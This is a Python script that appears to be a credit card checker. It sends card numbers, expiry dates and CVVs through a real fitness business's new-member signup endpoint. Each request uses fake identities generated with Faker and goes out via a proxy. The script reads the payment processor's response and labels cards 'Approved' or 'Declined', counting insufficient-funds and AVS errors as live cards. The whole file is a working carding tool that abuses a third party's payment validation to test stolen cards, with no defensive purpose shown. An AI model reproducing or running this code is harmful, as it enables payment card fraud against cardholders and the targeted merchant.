import uuid
import faker
from httpx import AsyncClient
import asyncio
async def nmi(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:

        fake = faker.Faker()
        email = str(uuid.uuid4()) + '@gmail.com'
        password = fake.password()
        
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://my.rhinofit.ca',
            'referer': 'https://my.rhinofit.ca/cal/4a6fecff?show=classes&agenda=month&minTime=7&maxTime=21&classes=all',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'hash': '4a6fecff',
        }

        data = {
            'u_username': email,
            'u_username_verify': email,
            'u_password': password,
            'u_password_verify': password,
            'u_first': fake.first_name(),
            'u_last': fake.last_name(),
            'u_address1': fake.street_address(),
            'u_address2': '',
            'u_city': fake.city(),
            'u_country': 'United States',
            'u_state': 'NJ',
            'u_zip': fake.zipcode(),
            'u_phone1': fake.phone_number(),
            'u_phone2': fake.phone_number(),
            'u_emergency_name': '',
            'u_emergency_phone': '',
            'u_birthday': '',
            'u_gender': '',
            'num': cc,
            'exp_month': mes,
            'exp_year': ano,
            'state_is_visible': 'false',
            'action': 'validatenewusercc_v2',
        }

        req1 = await web.post('https://my.rhinofit.ca/forms/memberutils.php', params=params, headers=headers, data=data)
        if "Account is setup" in req1.text:
            status = "Approved ✅"
            mensaje = "Charged $0.00"
        else:
            mensaje = req1.text.split('[0] => ')[1].split('\\n')[0]
            if "Insufficient funds" in mensaje:
                status = "Approved ✅"
            elif "AVS" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status, mensaje